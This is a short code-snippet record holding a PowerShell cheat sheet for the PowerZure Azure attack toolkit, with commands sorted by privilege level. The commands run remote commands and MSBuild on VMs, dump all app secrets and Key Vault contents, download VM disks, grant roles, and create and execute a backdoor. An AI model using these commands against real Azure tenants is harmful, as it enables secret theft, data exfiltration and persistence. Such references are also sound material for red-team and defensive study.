---
id: 2a6bb5e2-85ee-4064-b8a2-a2cce5a791d3
type: code
language: Powershell
verified: false
created_at: '2023-04-06T03:56:14.586356+00:00'
updated_at: '2023-04-10T20:19:39.811529+00:00'
---

# Code Snippet 2a6bb5e2

**Language**: Powershell

```powershell
# Require az module !
$ ipmo .\PowerZure
$ Set-Subscription -Id [idgoeshere]

# Reader
$ Get-Runbook, Get-AllUsers, Get-Apps, Get-Resources, Get-WebApps, Get-WebAppDetails

# Contributor
$ Execute-Command -OS Windows -VM Win10Test -ResourceGroup Test-RG -Command "whoami"
$ Execute-MSBuild -VM Win10Test  -ResourceGroup Test-RG -File "build.xml"
$ Get-AllSecrets # AllAppSecrets, AllKeyVaultContents
$ Get-AvailableVMDisks, Get-VMDisk # Download a virtual machine's disk

# Owner
$ Set-Role -Role Contributor -User test@contoso.com -Resource Win10VMTest

# Administrator
$ Create-Backdoor, Execute-Backdoor
```


